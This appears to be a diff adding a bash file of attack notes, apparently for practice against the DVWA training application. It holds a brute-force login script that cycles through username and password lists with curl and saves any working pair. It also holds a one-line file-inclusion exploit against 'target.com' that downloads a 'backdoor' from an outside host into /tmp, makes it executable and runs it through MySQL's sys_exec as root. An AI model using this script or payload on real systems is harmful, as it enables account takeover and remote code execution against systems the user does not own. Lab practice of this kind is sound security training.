@@ -1,0 +1,29 @@
+#!/bin/bash
+for USER in $(cat $1)
+do
+    for PASS in $(cat $2)
+    do
+        curl -v -i -L -A "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/5.0)" --max-time 10 -d "user=$USER&password=$PASS&Login=Login" --cookie-jar cookie.txt --cookie cookie.txt -o result.txt --stderr /dev/null -e "http://127.0.0.1" http://127.0.0.1/dvwa/login.php
+        echo $USER:$PASS
+        grep -q "failed" result.txt
+
+        if [ $? -eq 1 ]
+        then
+            echo $USER:$PASS >> account.txt
+            clear
+            echo "Password Found: $USER:$PASS"
+            exit
+        fi
+    done
+done
+
+
+-i       include header
+-L       following redirect
+-o       output to file
+--stderr error to file
+
+
+
+
+curl --cookie "PHPSESSID" "http://target.com/member.php?username=/proc/self/fd/9%00&cmd=$(php -r "echo urlencode('wget wget 192.168.0.1:8000/backdoor -P /tmp/ && chmod +x /tmp/backdoor && mysql -uroot -e \"SELECT sys_exec(\'/tmp/backdoor\');\" ');")"
